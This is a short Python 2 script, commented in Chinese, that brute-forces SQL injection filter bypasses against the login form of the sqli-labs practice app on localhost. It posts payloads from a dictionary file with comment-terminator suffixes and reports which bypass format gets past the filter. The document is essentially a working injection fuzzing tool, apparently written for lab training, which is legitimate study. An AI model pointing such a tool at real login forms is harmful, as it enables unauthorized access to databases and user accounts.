# -*- coding: utf-8 -*-
import urllib2
import urllib
from urllib import quote
#脚本应用于get请求单框注入情况下
#定义一个url
import time

#探测是否对ID进行了() , “”格式重置
url='http://localhost/sqli-labs/Less-13/' #lesson 11
#当返回结果为文字时使用结果字符串
#keyword='Login name:'
#当返回结果为图片文件时，keyword推荐使用图片文件名
keyword='flag.jpg'
#keyword需要根据各个标的回显格式不同更改
payload_end='-- #/*'
password='*/-- #'
filename="D:/workplaceforpy/SQL Injection/POST注入/dict/过滤/基础过滤规则.txt"
uipath = unicode(filename, "utf8")
for line in open(uipath):
    line=line.replace("\n","")
    try:
        # 定义要提交的数据
        #不同页面dic也不尽相同
        regular=line[line.find('###'):len(line)]
        line=line[0:line.find('###')]
        postdata = dict(uname=line+payload_end, passwd=password,submit='Submit')
        # url编码
        postdata = urllib.urlencode(postdata)
        print postdata
        # enable cookie
        req = urllib2.Request(url, postdata)
        res = urllib2.urlopen(req,data=None,timeout=2)
        text=res.read()
    except Exception ,e:
        print e
    # print text
    if(text.find(keyword)>0):
        print '回显为：'
        print text
        print '过滤规则为：=================>>   '+regular.decode('gb2312').encode('utf-8')
        print '绕过格式为：========>>   '+line
        break

